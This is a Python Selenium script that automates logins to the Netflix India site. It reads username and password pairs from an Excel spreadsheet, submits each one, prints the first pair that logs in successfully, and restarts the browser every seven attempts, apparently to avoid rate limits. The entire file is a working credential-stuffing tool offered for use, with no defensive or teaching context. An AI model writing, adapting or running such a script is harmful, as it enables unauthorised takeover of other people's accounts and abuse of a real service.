from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import openpyxl
import time
import Excel_functions
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.get("https://www.netflix.com/in/login")
time.sleep(2)

# Change below to the path where you have pasted the usernames and passwords

path="C:/Users/HP/Documents/ids1.xlsx"
r=Excel_functions.getrowcount(path,"Sheet1")
for rn in range(1,r+1):
    driver.find_element("xpath",
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/label/input').clear()
    driver.find_element("xpath",
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/label/input').send_keys(Excel_functions.readata(path, "Sheet1", rn, 1))
    time.sleep(1)
    driver.find_element("xpath",
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label/input').clear()
    driver.find_element("xpath",
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label/input').send_keys(Excel_functions.readata(path, "Sheet1", rn, 2))
    time.sleep(1)
    driver.find_element("xpath",'/html/body/div[1]/div/div[3]/div/div/div[1]/form/button').click()
    time.sleep(2)
    if driver.current_url!="https://www.netflix.com/in/login":
        print(Excel_functions.readata(path, "Sheet1", rn, 1), "-", Excel_functions.readata(path, "Sheet1", rn, 2))
        break
    if rn%7==0:
        print(rn)
        driver.quit()
        driver = webdriver.Chrome(executable_path="./chromedriver")
        driver.get("https://www.netflix.com/in/login")
        time.sleep(2)
driver.quit()





